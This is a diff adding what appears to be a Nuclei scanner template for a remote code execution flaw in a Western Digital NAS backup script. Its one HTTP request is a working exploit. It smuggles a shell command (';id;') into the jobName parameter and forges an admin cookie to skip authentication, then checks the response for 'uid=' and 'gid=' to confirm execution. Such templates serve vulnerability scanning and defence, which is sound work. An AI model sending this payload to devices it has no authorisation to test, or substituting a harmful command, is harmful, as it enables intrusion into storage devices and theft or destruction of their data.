@@ -1,0 +1,29 @@
+id: WesternDigital-remoteBackups-RCE
+
+info:
+  name: WesternDigital-remoteBackups-RCE
+  author: iSee857
+  severity: Critical
+  description: |
+    WesternDigital-remoteBackups-RCE
+  tags: WesternDigital,rce
+
+http:
+  - raw:
+      - |
+        GET /web/php/remoteBackups.php?cmd=getRecoverItems&jobName=";id;" HTTP/1.1
+        Host: {{Hostname}}
+        Cookie: isAdmin=1; username=admin;
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "uid="
+          - "gid="
+        condition: and
+
+      - type: status
+        status:
+          - 200
